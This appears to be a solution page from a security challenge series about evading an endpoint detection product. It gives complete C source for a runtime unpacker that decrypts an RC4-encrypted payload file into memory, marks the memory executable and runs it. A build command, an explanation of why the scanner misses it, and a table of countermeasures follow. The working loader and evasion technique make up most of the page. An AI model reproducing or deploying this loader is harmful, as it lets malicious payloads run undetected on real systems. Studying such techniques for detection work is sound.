---
title: "Solution 36: Runtime Unpacking Evasion"
difficulty: hard
category: "Packer & PE Evasion"
---

[Back to Challenge]({{ '/challenges/36-runtime-unpacking/' | relative_url }})

## Overview

The EDR analyzes the PE file once at process creation. A clean-looking stub that unpacks and executes a payload at runtime is never re-examined.

## Solution

```c
// runtime_unpacker.c
// On disk: clean PE with normal sections, normal imports
// At runtime: reads encrypted payload from resource/file, decrypts, executes

#include <windows.h>
#include <stdio.h>

// RC4-decrypt function (simple stream cipher)
void rc4(unsigned char* data, size_t len,
         unsigned char* key, size_t keylen) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = (unsigned char)i;

    unsigned char j = 0;
    for (int i = 0; i < 256; i++) {
        j = j + S[i] + key[i % keylen];
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }

    unsigned char a = 0, b = 0;
    for (size_t n = 0; n < len; n++) {
        a++;
        b += S[a];
        unsigned char tmp = S[a]; S[a] = S[b]; S[b] = tmp;
        data[n] ^= S[(unsigned char)(S[a] + S[b])];
    }
}

int main() {
    // Step 1: Read encrypted payload from a separate file
    // (could also be embedded as a PE resource)
    HANDLE hFile = CreateFileA("payload.enc", GENERIC_READ,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    DWORD fileSize = GetFileSize(hFile, NULL);
    unsigned char* encrypted = (unsigned char*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, encrypted, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Step 2: Allocate RW memory (not RWX)
    LPVOID exec_mem = VirtualAlloc(NULL, fileSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Step 3: Decrypt into allocated memory
    memcpy(exec_mem, encrypted, fileSize);
    unsigned char key[] = "ThisIsTheDecryptionKey";
    rc4((unsigned char*)exec_mem, fileSize, key, sizeof(key) - 1);
    free(encrypted);

    // Step 4: Make executable (RWX transition happens only in memory)
    DWORD oldProtect;
    VirtualProtect(exec_mem, fileSize,
        PAGE_EXECUTE_READ, &oldProtect);

    // Step 5: Execute decrypted payload
    ((void(*)())exec_mem)();

    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
```

```powershell
# Build the unpacker stub — looks completely normal
cl /O2 runtime_unpacker.c /Fe:stub.exe

# The stub.exe has:
#   - Normal section names (.text, .data, .rdata)
#   - No RWX sections on disk
#   - Normal imports (kernel32.dll only)
#   - Different hash from any known malware

# Rule 6: hash doesn't match (stub is a new binary)
# Rule 9: no packer sections, no RWX, entry in .text
# Result: complete evasion
```

## Why It Works

The EDR is a **point-in-time scanner** — it reads the PE file when the process appears in the snapshot, runs its checks, and moves on. It never:

1. Re-scans process memory after startup
2. Monitors `VirtualAlloc` / `VirtualProtect` sequences
3. Detects code execution from dynamically allocated memory
4. Intercepts file reads of `payload.enc`

The on-disk `stub.exe` is genuinely clean — it's a small C program with standard imports. The malicious payload only exists decrypted in memory, briefly, and is never written to disk.

## Countermeasures

| Defense | What It Does |
|---------|-------------|
| ETW-TI monitoring | Sees VirtualAlloc + VirtualProtect + thread execution at kernel level |
| Periodic memory scanning | Re-scan process memory for known patterns |
| Behavioral analysis | Detect the alloc → write → protect → execute sequence |
| Call stack inspection | Execution from VirtualAlloc'd memory without a module is suspicious |
| AMSI integration | Scan buffers before execution |
